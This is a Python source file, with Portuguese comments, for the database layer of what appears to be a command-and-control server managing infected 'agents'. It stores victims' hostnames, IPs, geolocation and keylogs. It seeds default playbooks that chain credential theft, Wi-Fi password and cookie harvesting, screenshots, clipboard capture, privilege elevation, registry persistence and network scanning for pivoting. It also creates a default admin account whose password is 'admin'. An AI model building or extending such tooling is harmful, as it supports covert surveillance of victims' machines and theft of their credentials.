# database.py
import sqlite3
import os
from werkzeug.security import check_password_hash # Importação no lugar correto

DB_FILE = "c2_database.sqlite"

def get_db_connection():
    """Cria e retorna uma conexão com o banco de dados, com row_factory para facilitar o acesso."""
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    # WAL mode: permite leituras concorrentes durante escritas (evita "database is locked"
    # sob carga múltipla de agentes + Flask + SocketIO)
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

# Mude para True se precisar forçar a recriação do banco de dados do zero.
# ATENÇÃO: Isso apagará todos os dados existentes.
FORCE_RECREATE_DB = False 

def _apply_migrations():
    """
    Aplica migrações incrementais ao schema existente.
    Seguro para executar múltiplas vezes -- só adiciona o que está faltando.
    """
    conn = get_db_connection()
    cursor = conn.cursor()

    # Verifica quais colunas a tabela tasks já tem
    cursor.execute("PRAGMA table_info(tasks)")
    existing_columns = {row['name'] for row in cursor.fetchall()}

    # Adiciona timestamp_started se ausente (state machine: quando agente pega a task)
    if 'timestamp_started' not in existing_columns:
        cursor.execute("ALTER TABLE tasks ADD COLUMN timestamp_started TEXT")
        print("[DB-MIGRATION] Coluna 'timestamp_started' adicionada à tabela tasks.")

    # Adiciona updated_at se ausente (auditoria: quando status mudou pela última vez)
    if 'updated_at' not in existing_columns:
        cursor.execute("ALTER TABLE tasks ADD COLUMN updated_at TEXT")
        print("[DB-MIGRATION] Coluna 'updated_at' adicionada à tabela tasks.")

    # Verifica quais colunas a tabela agents já tem
    cursor.execute("PRAGMA table_info(agents)")
    existing_agent_cols = {row['name'] for row in cursor.fetchall()}

    # Adiciona tags se ausente (ex: "DC,web,pwned" -- CSV simples)
    if 'tags' not in existing_agent_cols:
        cursor.execute("ALTER TABLE agents ADD COLUMN tags TEXT DEFAULT ''")
        print("[DB-MIGRATION] Coluna 'tags' adicionada à tabela agents.")

    # Adiciona notes se ausente (notas livres do operador sobre o host)
    if 'notes' not in existing_agent_cols:
        cursor.execute("ALTER TABLE agents ADD COLUMN notes TEXT DEFAULT ''")
        print("[DB-MIGRATION] Coluna 'notes' adicionada à tabela agents.")

    # Adiciona issued_by se ausente (rastreabilidade: qual operador emitiu a task)
    if 'issued_by' not in existing_columns:
        cursor.execute("ALTER TABLE tasks ADD COLUMN issued_by TEXT")
        print("[DB-MIGRATION] Coluna 'issued_by' adicionada à tabela tasks.")

    # Migra status em português para inglês (state machine padronizada)
    migrations_status = [
        ("UPDATE tasks SET status = 'pending'     WHERE status = 'pendente'",   'pendente   -> pending'),
        ("UPDATE tasks SET status = 'in_progress' WHERE status = 'executando'", 'executando -> in_progress'),
        ("UPDATE tasks SET status = 'completed'   WHERE status = 'concluido'",  'concluido  -> completed'),
        ("UPDATE tasks SET status = 'failed'      WHERE status = 'erro'",       'erro       -> failed'),
    ]
    for sql, label in migrations_status:
        cursor.execute(sql)
        if cursor.rowcount > 0:
            print(f"[DB-MIGRATION] Status migrado: {label} ({cursor.rowcount} tasks)")

    # Cria tabela playbooks se ausente (adicionada em v6.1)
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS playbooks (
        id          TEXT PRIMARY KEY,
        name        TEXT NOT NULL UNIQUE,
        description TEXT,
        steps       TEXT NOT NULL,
        created_by  TEXT DEFAULT 'system',
        created_at  TEXT NOT NULL
    )
    ''')
    if cursor.execute('SELECT COUNT(*) FROM playbooks').fetchone()[0] == 0:
        import json as _j, uuid as _u
        from datetime import datetime as _d
        now = _d.now().isoformat()
        DEFAULT_PLAYBOOKS = [
            ('Full Recon',        'Reconhecimento completo: sistema, processos, rede e credenciais.',
             _j.dumps([{'command':'sysinfo','args':''},{'command':'processes','args':''},
                        {'command':'network_recon','args':''},{'command':'credentials','args':''},
                        {'command':'wifi_passwords','args':''}])),
            ('Stealth Survey',    'Coleta silenciosa: screenshot, clipboard e cookies.',
             _j.dumps([{'command':'screenshot','args':''},{'command':'clipboard','args':''},
                        {'command':'cookies','args':''}])),
            ('Persistence Setup', 'Eleva privilegios e instala persistencia.',
             _j.dumps([{'command':'elevate','args':''},{'command':'persist','args':'registry'}])),
            ('Network Map',       'Mapeia a rede interna e identifica alvos de pivoteamento.',
             _j.dumps([{'command':'network_recon','args':''},{'command':'network_scan','args':''}])),
            ('Evidence Collection','Coleta evidencias forenses: credenciais, cookies, senhas Wi-Fi.',
             _j.dumps([{'command':'credentials','args':''},{'command':'cookies','args':''},
                        {'command':'wifi_passwords','args':''},{'command':'screenshot','args':''}])),
        ]
        for name, desc, steps in DEFAULT_PLAYBOOKS:
            cursor.execute(
                'INSERT OR IGNORE INTO playbooks (id,name,description,steps,created_by,created_at) VALUES (?,?,?,?,?,?)',
                (str(_u.uuid4()), name, desc, steps, 'system', now)
            )
        print("[DB-MIGRATION] Tabela 'playbooks' criada com 5 playbooks padrão.")

    conn.commit()
    conn.close()
    print("[DB-MIGRATION] Migrações aplicadas com sucesso.")


def init_db():
    """Inicializa o banco de dados, criando todas as tabelas necessárias se não existirem."""
    
    if FORCE_RECREATE_DB and os.path.exists(DB_FILE):
        print("[DB] MODO DE FORÇAR RECRIAR ATIVO. Apagando banco de dados antigo...")
        os.remove(DB_FILE)

    # A verificação de existência do DB não é mais necessária aqui,
    # pois os comandos CREATE TABLE IF NOT EXISTS são seguros.
    
    print("[DB] Verificando e inicializando banco de dados...")
    conn = get_db_connection()
    cursor = conn.cursor()

    # Tabela para armazenar informações dos agentes
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS agents (
        id TEXT PRIMARY KEY,
        username TEXT,
        hostname TEXT,
        internal_ip TEXT,
        external_ip TEXT,
        os_name TEXT,
        privileges TEXT,
        agent_version TEXT,
        first_seen TEXT,
        last_seen TEXT,
        status TEXT,
        geo_latitude REAL,
        geo_longitude REAL,
        geo_city TEXT,
        geo_country TEXT,
        geo_last_checked INTEGER
    );
    ''')

    # Tabela para armazenar tarefas
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS tasks (
        id TEXT PRIMARY KEY,
        agent_id TEXT NOT NULL,
        command TEXT NOT NULL,
        args TEXT,
        status TEXT NOT NULL,
        timestamp_issued TEXT NOT NULL,
        result TEXT,
        data_type TEXT, 
        FOREIGN KEY (agent_id) REFERENCES agents (id) ON DELETE CASCADE
    );
    ''')

    # Tabela para armazenar logs do sistema (eventos)
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS system_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT NOT NULL,
        event_type TEXT NOT NULL,
        message TEXT,
        timestamp TEXT NOT NULL
    );
    ''')

    # Tabela para armazenar keylogs
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS keylogs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT NOT NULL,
        log_data TEXT,
        timestamp TEXT NOT NULL,
        FOREIGN KEY (agent_id) REFERENCES agents (id) ON DELETE CASCADE
    );
    ''')

    # --- INÍCIO DA ADIÇÃO PARA RBAC ---

    # 1. Cria a tabela de usuários
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role TEXT NOT NULL CHECK(role IN ('Administrator', 'Operator', 'Observer')),
        created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    ''')

    # 2. Insere o usuário administrador padrão, APENAS SE ELE NÃO EXISTIR
    cursor.execute("SELECT id FROM users WHERE username = 'admin'")
    if cursor.fetchone() is None:
        print("[DB] Usuário 'admin' não encontrado. Criando usuário padrão...")
        # O hash da senha 'admin'
        admin_password_hash = 'pbkdf2:sha256:600000$VODu3x3xZ8fK7Y2h$c8b182a294432718c144a8730f6e1a3a34f25c2b58b05923b168955c2c1a312e'
        cursor.execute(
            "INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
            ('admin', admin_password_hash, 'Administrator')
        )
        print("[DB] Usuário 'admin' com senha 'admin' e função 'Administrator' criado.")

    # --- FIM DA ADIÇÃO PARA RBAC ---

    # Tabela de perfil acumulado por agente (última coleta de cada tipo)
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS agent_profile (
        agent_id TEXT PRIMARY KEY,
        sysinfo TEXT,
        sysinfo_at TEXT,
        processes TEXT,
        processes_at TEXT,
        network_recon TEXT,
        network_recon_at TEXT,
        FOREIGN KEY (agent_id) REFERENCES agents (id) ON DELETE CASCADE
    );
    ''')

    # Tabela de configurações gerais do C2 (chave-valor)
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS c2_settings (
        key   TEXT PRIMARY KEY,
        value TEXT NOT NULL
    );
    ''')

    # Tabela de Playbooks -- sequencias pre-definidas de comandos
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS playbooks (
        id          TEXT PRIMARY KEY,
        name        TEXT NOT NULL UNIQUE,
        description TEXT,
        steps       TEXT NOT NULL,
        created_by  TEXT DEFAULT 'system',
        created_at  TEXT NOT NULL
    )
    ''')

    # Playbooks padrao -- inseridos apenas se a tabela estiver vazia
    from datetime import datetime as _dt
    import json as _json, uuid as _uuid
    if cursor.execute('SELECT COUNT(*) FROM playbooks').fetchone()[0] == 0:
        DEFAULT_PLAYBOOKS = [
            {
                'name': 'Full Recon',
                'description': 'Reconhecimento completo: sistema, processos, rede e credenciais.',
                'steps': _json.dumps([
                    {'command': 'sysinfo',      'args': ''},
                    {'command': 'processes',    'args': ''},
                    {'command': 'network_recon','args': ''},
                    {'command': 'credentials',  'args': ''},
                    {'command': 'wifi_passwords','args': ''},
                ]),
            },
            {
                'name': 'Stealth Survey',
                'description': 'Coleta silenciosa: screenshot, clipboard e keylogs recentes.',
                'steps': _json.dumps([
                    {'command': 'screenshot',   'args': ''},
                    {'command': 'clipboard',    'args': ''},
                    {'command': 'cookies',      'args': ''},
                ]),
            },
            {
                'name': 'Persistence Setup',
                'description': 'Eleva privilegios e instala persistencia.',
                'steps': _json.dumps([
                    {'command': 'elevate',      'args': ''},
                    {'command': 'persist',      'args': 'registry'},
                ]),
            },
            {
                'name': 'Network Map',
                'description': 'Mapeia a rede interna e identifica alvos de pivoteamento.',
                'steps': _json.dumps([
                    {'command': 'network_recon','args': ''},
                    {'command': 'network_scan', 'args': ''},
                ]),
            },
            {
                'name': 'Evidence Collection',
                'description': 'Coleta evidencias forenses: credenciais, cookies, senhas Wi-Fi.',
                'steps': _json.dumps([
                    {'command': 'credentials',   'args': ''},
                    {'command': 'cookies',        'args': ''},
                    {'command': 'wifi_passwords', 'args': ''},
                    {'command': 'screenshot',     'args': ''},
                ]),
            },
        ]
        now = _dt.now().isoformat()
        for pb in DEFAULT_PLAYBOOKS:
            cursor.execute(
                'INSERT INTO playbooks (id, name, description, steps, created_by, created_at) VALUES (?,?,?,?,?,?)',
                (str(_uuid.uuid4()), pb['name'], pb['description'], pb['steps'], 'system', now)
            )

    # Indexes de performance -- tasks e as queries mais frequentes
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_tasks_agent_id      ON tasks(agent_id)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_tasks_status         ON tasks(status)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_tasks_data_type      ON tasks(data_type)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_tasks_timestamp      ON tasks(timestamp_issued)')
    # Indexes em tabelas auxiliares consultadas por agent_id
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_keylogs_agent_id     ON keylogs(agent_id)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_system_logs_agent_id ON system_logs(agent_id)')

    conn.commit()
    conn.close()
    print("[DB] Verificação do banco de dados concluída.")
    _apply_migrations()


# --- FUNÇÕES DE GERENCIAMENTO DE USUÁRIOS ---

def get_user_by_username(username):
    """Busca um usuário pelo nome de usuário."""
    conn = get_db_connection()
    user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
    conn.close()
    return user


def check_user_password(username, password):
    """Verifica se a senha de um usuário está correta, retornando os dados do usuário em caso de sucesso."""
    user = get_user_by_username(username)
    if user and check_password_hash(user['password_hash'], password):
        return user
    return None
